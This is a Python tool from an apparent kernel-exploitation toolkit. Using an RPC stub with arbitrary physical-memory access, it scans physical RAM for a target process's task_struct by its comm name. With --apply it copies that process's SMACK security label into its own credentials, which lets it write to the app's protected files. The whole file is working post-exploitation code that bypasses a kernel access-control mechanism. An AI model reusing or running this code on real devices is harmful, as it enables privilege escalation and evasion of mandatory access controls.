"""Resumable physical scan for a task comm, then borrow its SMACK label.

DIAGNOSTIC - not on the production path (deploy/recover do not use it).  It is
kept because borrowing a running app's label is the fastest way to write its
`bin/` without the app's own channel, and it documents the scan/reconnect trick.

The task list is damaged on this kernel (walks die within a few dozen hops, and
`init_task`'s own links are corrupt), so the only reliable way to find another
process's task_struct is a physical scan for its comm. Long scans can desync the
RPC stream when a batch aborts on an unmappable page; the desync is per-connection,
so this loop reconnects to the *same* stub and resumes from the failed page
instead of starting over.

Usage: python tools/find_task.py [--comm DN_trol-Service] [--apply]
"""
import argparse
import struct
import sys
import time
from pathlib import Path

TOOLS = Path(__file__).resolve().parent
sys.path.insert(0, str(TOOLS))

import physmap as T            # noqa: E402
import kernel_root as K        # noqa: E402
import smack_relabel as R      # noqa: E402

LO, HI = 0x20000000, 0x40000000
PAGE = 0x1000


def task_ok(rpc, task, comm):
    try:
        c = rpc.read(task + K.O_COMM, 16).split(bytes([0]))[0]
        cred = rpc.read_u32(task + K.O_CRED)
    except Exception:
        return False
    return c.startswith(comm) and T._kernel_ptr(cred)


def scan(comm, lo=LO, hi=HI, batch=128):
    """[(task_phys, pid)] for tasks whose comm starts with `comm`."""
    hits = []
    page = lo
    rpc = T.RPC(timeout=15)
    if not R.sanity(rpc):
        print("stub not in sync at start", flush=True)
        rpc.close()
        return None
    while page < hi:
        n = min(batch, (hi - page) // PAGE)
        try:
            for p, data in rpc.readmany(page, n):
                if data is None:
                    continue
                i = data.find(comm)
                while i >= 0:
                    task = (p + i - K.O_COMM) & 0xFFFFFFFF
                    if task_ok(rpc, task, comm):
                        pid = rpc.read_u32(task + 0x2E8)
                        if (task, pid) not in hits:
                            hits.append((task, pid))
                            print(f"[+] {comm.decode()} task {T.hexs(task)} "
                                  f"pid={pid}", flush=True)
                    i = data.find(comm, i + 1)
            page += n * PAGE
        except Exception as exc:
            print(f"[!] {type(exc).__name__} at {T.hexs(page)} - reconnecting",
                  flush=True)
            try:
                rpc.close()
            except Exception:
                pass
            time.sleep(0.5)
            page += n * PAGE          # resume past the batch that failed
            rpc = None
            for attempt in range(5):
                try:
                    new = T.RPC(timeout=15)
                    if R.sanity(new):
                        rpc = new
                        break
                    # An out-of-sync stub must be closed, not abandoned: the
                    # old loop overwrote it on the next attempt (fd/socket leak).
                    new.close()
                except Exception:
                    pass
                time.sleep(1.0)
            if rpc is None:
                print("[-] could not re-establish an in-sync stub", flush=True)
                return hits
        if page % 0x4000000 == 0:
            print(f"    scanned to {T.hexs(page)}, {len(hits)} hit(s)", flush=True)
        if rpc is not None and not R.sanity(rpc):
            print(f"[!] desync at {T.hexs(page)} - reconnecting", flush=True)
            try:
                rpc.close()
            except Exception:
                pass
            rpc = None
            for attempt in range(5):
                try:
                    new = T.RPC(timeout=15)
                    if R.sanity(new):
                        rpc = new
                        break
                    new.close()
                except Exception:
                    pass
                time.sleep(1.0)
            if rpc is None:
                return hits
    if rpc is not None:
        rpc.close()
    return hits


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--comm", default="DN_trol-Service",
                    help="task comm prefix (the payload app shows as "
                         "DN_trol-Service: 16-char TASK_COMM_LEN truncation)")
    ap.add_argument("--apply", action="store_true")
    ap.add_argument("--lo", default=hex(LO))
    ap.add_argument("--hi", default=hex(HI))
    args = ap.parse_args()
    comm = args.comm.encode()

    hits = scan(comm, int(args.lo, 16), int(args.hi, 16))
    if hits is None:
        print("NO_STUB", flush=True)
        return 2
    print(f"[+] {len(hits)} hit(s) total", flush=True)
    if not hits:
        print(f"NOT_FOUND ({args.comm}) - is the app running?", flush=True)
        return 3
    for task, pid in hits:
        print(f"    task {T.hexs(task)} pid={pid}", flush=True)

    if not args.apply:
        print("[*] dry run (pass --apply to borrow the label and patch)", flush=True)
        return 0

    # borrow the label pointer from the first hit
    rpc = T.RPC(timeout=20)
    try:
        if not R.sanity(rpc):
            print("DESYNCED", flush=True)
            return 4
        excl = K._tagged_near_tail(rpc, 0xC0957180, 0x20957180, R.OFF, b"PHYRFORK", 40)
        me = rpc.read_u32(K.PHYS(R.find_stub_task(rpc, excl)) + 0x2F0)
        my_cred = rpc.read_u32(K.PHYS(me) + K.O_CRED)
        my_blob = rpc.read_u32(K.PHYS(my_cred) + R.CRED_SECURITY)
        mine = R.sane_smack_blob(rpc, my_blob)
        if not mine:
            print("[-] our cred->security is not a task_smack", flush=True)
            return 5
        app_task = hits[0][0]
        app_cred = rpc.read_u32(K.PHYS(app_task) + K.O_CRED)
        app_blob = rpc.read_u32(K.PHYS(app_cred) + R.CRED_SECURITY)
        theirs = R.sane_smack_blob(rpc, app_blob)
        if not theirs:
            print("[-] app cred->security is not a task_smack", flush=True)
            return 6
        print(f"[+] ours blob {T.hexs(my_blob)} smk={T.hexs(mine[0])}", flush=True)
        print(f"[+] app  blob {T.hexs(app_blob)} smk={T.hexs(theirs[0])}", flush=True)
        if mine[0] == theirs[0]:
            print("[-] same label already; nothing to do", flush=True)
            return 7
        for delta, val in ((0, theirs[0]), (4, theirs[0])):
            st = rpc.write32(R.phys(my_blob) + delta, val)
            print(f"[{'*' if st == 0 else '!'}] blob+{delta} <- {T.hexs(val)}",
                  flush=True)
        got = struct.unpack("<2I", rpc.read(R.phys(my_blob), 8))
        ok = got[0] == theirs[0] and got[1] == theirs[0]
        print(f"[{'*' if ok else '!'}] readback {'BORROWED APP LABEL' if ok else 'MISMATCH'}",
              flush=True)
        return 0 if ok else 8
    finally:
        rpc.close()


if __name__ == "__main__":
    sys.exit(main())
